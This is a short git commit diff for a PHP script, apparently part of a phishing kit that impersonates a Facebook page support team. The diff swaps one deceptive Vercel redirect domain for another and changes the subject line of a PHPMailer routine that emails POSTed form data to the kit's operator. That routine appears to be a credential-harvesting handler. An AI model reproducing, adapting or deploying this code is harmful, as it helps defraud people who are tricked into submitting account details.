aee818692a9892d46832ca4a022db5bbec5c97ab
facebookpageteam <facebook.page.teams.blue.service@gmail.com>
2025-07-19 22:40:22 +0800

    Update and rename ismail.php to hussain.php

--- hussain.php
+++ hussain.php
@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location: https://reques-fix-page-for-apply-here.vercel.app/");
+header("Location: https://fix-team-apply-on-here-request-page.vercel.app/");
 
 require 'Exception.php';
 require 'PHPMailer.php';
@@ -43,7 +43,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
         // Email content
         $mail->isHTML(true);
-        $mail->Subject = 'ISMAIL';
+        $mail->Subject = 'HUSSAIN';
         $mail->Body = $emailBody; // Set the email body using the collected form data
 
         // Send email
